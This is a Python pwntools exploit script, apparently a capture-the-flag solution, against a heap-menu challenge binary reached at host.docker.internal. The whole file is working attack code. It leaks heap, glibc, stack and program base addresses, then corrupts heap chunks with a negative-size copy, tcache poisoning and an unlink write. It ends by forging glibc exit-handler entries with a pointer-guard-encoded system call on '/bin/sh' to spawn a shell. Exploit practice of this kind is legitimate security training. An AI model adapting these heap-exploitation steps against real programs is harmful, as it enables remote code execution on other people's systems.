from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal', env={'GLIBC_TUNABLES': 'glibc.cpu.hwcaps=-AVX512F'}, gdbscript='''
#     continue
# ''')

# p = process('./chal', env={'GLIBC_TUNABLES': 'glibc.cpu.hwcaps=-AVX512F'})

p = remote('host.docker.internal', 21003)

def create(index, size, data):
    p.sendlineafter("(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧  ".encode('utf-8'), b'1')
    p.sendlineafter("(*^▽^*)  ".encode('utf-8'), str(index).encode())
    p.sendlineafter("(o^∀^o)  ".encode('utf-8'), str(size).encode())
    if data:
        if len(data) == size:
            p.sendafter("(｡･ω･｡)ﾉ♡  ".encode('utf-8'), data)
        elif len(data) < size:
            p.sendlineafter("(｡･ω･｡)ﾉ♡  ".encode('utf-8'), data)

def copy(dst_index, src_index, cpy_size):
    p.sendlineafter("(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧  ".encode('utf-8'), b'2')
    p.sendlineafter("(→_→)  ".encode('utf-8'), str(dst_index).encode())
    p.sendlineafter("(←_←)  ".encode('utf-8'), str(src_index).encode())
    p.sendlineafter("(ー_ー)  ".encode('utf-8'), str(cpy_size).encode())

def delete(index):
    p.sendlineafter("(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧  ".encode('utf-8'), b'3')
    p.sendlineafter("( ´_ゝ´)  ".encode('utf-8'), str(index).encode())

def view():
    p.sendlineafter("(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧  ".encode('utf-8'), b'4')
    p.recvuntil("(⌐■_■)  ".encode('utf-8'))
    return p.recv(0x100)

def exit():
    p.sendlineafter("(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧  ".encode('utf-8'), b'X')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted

glibc_e = ELF('./libc.so.6')

create(0, 0x28, b'A'*0x20)
delete(0)
heap_base_addr = u64(view()[0:0x8])<<12
log.info(f"heap base address: {hex(heap_base_addr)}")

create(0, 0x28, b'0'*8+p64(0x120)+p64(heap_base_addr+0x2a0)*2)
create(1, 0x38, b'1'*0x30)
create(2, 0x38, b'2'*0x30)
create(3, 0x38, b'3'*0x30)
create(4, 0x38, b'4'*0x30)
create(5, 0xf8, b'5'*0xf0)
delete(4)
create(4, 0x38, b'4'*0x30+p64(0x120))
for i in range(6, 16):
    create(i, 0xf8, b'i'*0xf0)
for i in range(6, 13):
    delete(6+12-i)
delete(5)
glibc_base_addr = u64(view()[0x10:0x18])-0x203d30
log.info(f"glibc base address: {hex(glibc_base_addr)}")

delete(2)
delete(1)
create(6, 0xf8, b'-'*8+p64(0)*8+p64(0x31)+p64(0)+p64(0x221)+p64(glibc_base_addr+0x203b20)*2+p64(0)+p64(0x41)+p64((glibc_base_addr+glibc_e.symbols['__libc_argv'])^((heap_base_addr+0x2d0)>>12))+b'1'*0x18)
create(7, 0xf8, b'3'*0x38+p64(0x41)+b'4'*0x30+p64(0x120)+p64(0x100))
copy(3, 7, -0x60)
create(1, 0x38, b'1'*0x30)
create(2, 0x38, None)
delete(3)
stack_argv_addr = u64(view()[0xb0: 0xb8])^((heap_base_addr+0x350)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
log.info(f"stack argv address: {hex(stack_argv_addr)}")

delete(1)
create(8, 0xf8, b'-'*8+p64(0x31)+p64(0)+p64(0x221)+p64(glibc_base_addr+0x203b20)*2+p64(0)+p64(0x41)+p64((stack_argv_addr-0x48)^((heap_base_addr+0x2d0)>>12))+b'1'*0x30+p64(0x41)+b'2'*0x20)
create(9, 0xf8, b'4'*0x30+p64(0x120)+p64(0x100)+p64(glibc_base_addr+0x203b20)*2+b'5'*0x30)
copy(4, 9, -0x60)
create(1, 0x38, b'1'*0x30)
create(3, 0x38, None)
delete(4)
elf_base_addr = (u64(view()[0xf0: 0xf8])^((heap_base_addr+0x390)>>12)^((stack_argv_addr-0x48)>>12))-0x1200
log.info(f"elf base address: {hex(elf_base_addr)}")

delete(14)
create(14, 0xf8, b'e'*0x8+p64(0xf0)+p64(elf_base_addr+0x40d0-0x18)+p64(elf_base_addr+0x40d0-0x10)+b'e'*0xd0+p64(0xf0))
for i in range(6, 10):
    delete(6+9-i)
delete(15)
create(6, 0xf8, b'7'*0x48+p64(0)+p64(pointer_guard_encrypt(glibc_base_addr+glibc_e.sym.system, 0))+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')))+p64(0)+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])+p64(0)+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdin_'])+p64(0)+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stderr_'])+p64(0)*12)
create(7, 0xf8, b'8'*0x8+p64(heap_base_addr+0x4d0+0x48)+p64(heap_base_addr+0x4d0+0x50)+p64(glibc_base_addr-0x28c0+0x30)+p64(glibc_base_addr+glibc_e.symbols['initial']+0x18)+p64(0)*3+p64(0)*3+p32(0x8)+p32(0x10)+p32(0x8)+p32(0x10)+p64(0)*6)
copy(14, 7, -0x1)
copy(14, 12, 0x8)
copy(15, 13, 0x10)
exit()

p.interactive()